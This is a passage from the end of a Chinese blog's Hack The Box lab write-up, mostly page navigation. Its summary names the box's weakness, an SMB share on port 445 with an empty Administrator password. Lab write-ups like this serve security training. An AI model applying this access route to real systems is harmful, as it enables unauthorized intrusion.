alt=""></p><p>get 下来即可</p><p><strong>总结：本台靶机的考点还是 445 端口的 smb 共享文件，Administrator 用户空密码</strong></p><div class="tags"><a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="ic i-tag"></i> 渗透</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-04-16 19:32:08" itemprop="dateModified" datetime="2024-04-16T19:32:08+08:00">2024-04-16</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>nnnpc <i class="ic i-at"><em>@</em></i>低头学习 抬头看路</li><li class="link"><strong>本文链接：</strong> <a href="https://nnnpc.github.io/2024/04/16/HTB%201%E5%B1%82/" title="HTB 1层">https://nnnpc.github.io/2024/04/16/HTB 1层/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/04/16/HTB%200%E5%B1%82/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;nnnpc-1311441040.cos.ap-shanghai.myqcloud.com&#x2F;1.jpg" title="HTB 0层"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 靶场</span><h3>HTB 0层</h3></a></div><div class="item right"><a href="/2024/04/16/HTB%20Keeper/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;nnnpc-1311441040.cos.ap-shanghai.myqcloud.com&#x2F;1.jpg" title="HTB Keeper"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 靶场</span><h3>HTB Keeper</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb-1%E5%B1%82"><span class="toc-number">1.</span> <span class="toc-text">HTB 1 层</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#appointment"><span class="toc-number">1.1.</span> <span class="toc-text">Appointment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sequel"><span class="toc-number">1.2.</span> <span class="toc-text">Sequel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crocodile"><span class="toc-number">1.3.</span> <span class="toc-text">Crocodile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#responder"><span class="toc-number">1.4.</span> <span class="toc-text">Responder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#three"><span class="toc-number">1.5.</span> <span class="toc-text">Three</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ignition"><span class="toc-number">1.6.</span> <span class="toc-text">Ignition</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bike"><span class="toc-number">1.7.</span> <span class="toc-text">Bike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#funnel"><span class="toc-number">1.8.</span> <span class="toc-text">Funnel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pennyworth"><span class="toc-number">1.9.</span> <span class="toc-text">Pennyworth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tactics"><span class="toc-number">1.10.</span> <span class="toc-text">Tactics</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2024/04/16/HackTheBox%20%E7%AC%AC0%E5%B1%82/" rel="bookmark" title="HackTheBox 第0层">HackTheBox 第0层</a></li><li><a href="/2024/04/16/HTB%200%E5%B1%82/" rel="bookmark" title="HTB 0层">HTB 0层</a></li><li class="active"><a href="/2024/04/16/HTB%201%E5%B1%82/" rel="bookmark" title="HTB 1层">HTB 1层</a></li><li><a href="/2024/04/16/HTB%20Keeper/" rel="bookmark" title="HTB Keeper">HTB Keeper</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="nnnpc" data-src="/images/avatar.jpg"><p class="name" itemprop="name">nnnpc</p><div class="description" itemprop="description">欢迎来交流学习</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">62</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">13</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/04/16/HTB%200%E5%B1%82/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/04/16/HTB%20Keeper/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/TLS%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/" title="TLS流量解密">TLS流量解密</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%B6%E5%AE%83/" title="分类于 其它">其它</a> <i class="ic i-angle-right"></i> <a href="/categories/%E5%85%B6%E5%AE%83/course-4/" title="分类于 杂记">杂记</a></div><span><a href="/2024/04/16/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="外部实体注入漏洞">外部实体注入漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/SHCTF%20MISC/" title="SHCTF MISC">SHCTF MISC</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WEB/" title="分类于 WEB">WEB</a></div><span><a href="/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow命令执行">CTFshow命令执行</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/%E5%AE%89%E6%B4%B5%E6%9D%AF2023%20Misc/" title="安洵杯2023 Misc">安洵杯2023 Misc</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WEB/" title="分类于 WEB">WEB</a></div><span><a href="/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/" title="CTFshow信息收集1-20">CTFshow信息收集1-20</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Misc/" title="分类于 Misc">Misc</a> <i class="ic i-angle-right"></i> <a href="/categories/MISC/" title="分类于 MISC">MISC</a> <i class="ic i-angle-right"></i> <a href="/categories/Misc/course-1/" title="分类于 比赛wp">比赛wp</a></div><span><a href="/2024/04/16/%E5%8F%A4%E5%89%91%E5%B1%B1%20Misc/" title="古剑山 Misc">古剑山 Misc</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/python/" title="分类于 python">python</a></div><span><a href="/2024/04/16/Pocsuite%E6%A1%86%E6%9E%B6/" title="Pocsuite框架">Pocsuite框架</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%B8%97%E9%80%8F/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/%E6%B8%97%E9%80%8F/course-3/" title="分类于 靶场">靶场</a></div><span><a href="/2024/04/16/HackTheBox%20%E7%AC%AC0%E5%B1%82/" title="HackTheBox 第0层">HackTheBox 第0层</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/GO/" title="分类于 GO">GO</a></div><span><a href="/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F/" title="go语言变量作用域">go语言变量作用域</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">nnnpc @ nnnpc's Blog</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2024/04/16/HTB 1层/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>